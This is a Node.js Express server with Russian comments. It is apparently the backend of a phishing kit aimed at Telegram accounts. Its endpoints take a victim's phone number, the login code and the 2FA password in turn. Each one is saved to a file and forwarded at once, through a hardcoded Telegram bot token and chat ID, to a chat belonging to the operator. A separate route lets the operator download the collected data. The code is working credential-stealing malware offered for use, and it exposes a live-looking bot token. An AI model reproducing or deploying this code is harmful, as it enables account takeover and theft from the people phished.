import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join('/tmp', 'data.txt');

// ===== ТОЛЬКО ДЛЯ ЛОГОВ (НОВЫЙ БОТ) =====
const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
const LOG_CHAT_ID = '7424945574';

console.log('📂 DATA_FILE:', DATA_FILE);

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM (ЛОГИ) =====
async function sendLog(message) {
    try {
        await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: LOG_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('📤 Лог отправлен в Telegram');
    } catch (err) {
        console.error('❌ Ошибка отправки лога:', err);
    }
}

// ===== 1. ПРИЁМ НОМЕРА =====
app.post('/api/phone', async (req, res) => {
    const { phone } = req.body;

    if (!phone || !/^\+\d{7,15}$/.test(phone)) {
        return res.status(400).json({ error: 'Invalid phone format' });
    }

    const data = { phone, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('📱 Phone:', phone);

    await sendLog(
        `📱 <b>Новый номер</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 2. ПРИЁМ КОДА =====
app.post('/api/verify', async (req, res) => {
    const { phone, code } = req.body;

    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔑 Phone + Code:', phone, code);

    await sendLog(
        `🔑 <b>Номер + код</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🔐 Код: <code>${code}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 3. ПРИЁМ 2FA ПАРОЛЯ =====
app.post('/api/2fa', async (req, res) => {
    const { phone, code, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({ error: 'Invalid 2FA data' });
    }

    const data = {
        phone,
        code: code || '',
        twofa_password: password,
        ip: req.ip,
        time: new Date().toISOString()
    };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔐 Phone + Code + 2FA:', phone, code, password);

    await sendLog(
        `🔐 <b>ПОЛНЫЕ ДАННЫЕ</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🔑 Код: <code>${code || 'не введён'}</code>\n` +
        `🔒 2FA пароль: <code>${password}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 4. СКАЧИВАНИЕ DATA.TXT =====
app.get('/download', (req, res) => {
    if (fs.existsSync(DATA_FILE)) {
        res.download(DATA_FILE, 'data.txt');
    } else {
        res.status(404).send('❌ Файл пока пуст.');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});